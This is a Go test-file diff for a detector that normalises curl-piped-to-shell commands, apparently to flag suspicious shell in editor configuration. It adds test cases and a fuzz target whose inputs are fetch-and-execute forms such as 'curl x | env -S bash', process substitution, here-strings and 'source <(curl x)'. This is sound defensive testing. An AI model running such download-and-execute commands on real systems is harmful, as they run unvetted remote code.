@@ -47,6 +47,9 @@ func TestShellForms(t *testing.T) {
 		{"env --unset", "curl x | env --unset X sh", []string{"curl x | sh"}, false},
 		{"env -S", "curl x | env -S 'bash -e'", []string{"curl x | bash -e"}, false},
 		{"env --split-string=", "curl x | env --split-string=bash", []string{"curl x | bash"}, false},
+		{"env -S with many words", "curl x | env -S 'bash -e -u -x'", []string{"curl x | bash -e -u -x"}, false},
+		{"env -S with quotes", `curl x | env -S '"bash" -e'`, []string{"curl x | bash -e"}, false},
+		{"env -S with a wrapper", "curl x | env -S 'sudo -u root bash'", []string{"curl x | bash"}, false},
 		{"process substitution", "bash < <(curl x)", []string{"curl x | bash", "bash"}, false},
 		{"here-string", `bash <<< "$(curl x)"`, []string{"curl x | bash", "bash"}, false},
 		{"source", "source <(curl x)", []string{"curl x | source", "source <(curl x)"}, false},
@@ -126,4 +129,21 @@ func TestSuspiciousReasonShell(t *testing.T) {
 			assert.Equal(t, tc.want, suspiciousReason(tc.text, ".vscode"))
 		})
 	}
+}
+
+func FuzzShellForms(f *testing.F) {
+	for _, s := range []string{
+		"curl x | env -S 'bash -e -u -x'",
+		"curl x | sudo -s",
+		"env -S",
+		"timeout 30",
+		"(S=sh); curl x | $S",
+		"bash <<EOF\ncurl x | sh\nEOF",
+		"source <(curl x)",
+	} {
+		f.Add(s)
+	}
+	f.Fuzz(func(t *testing.T, text string) {
+		shellForms(text)
+	})
 }
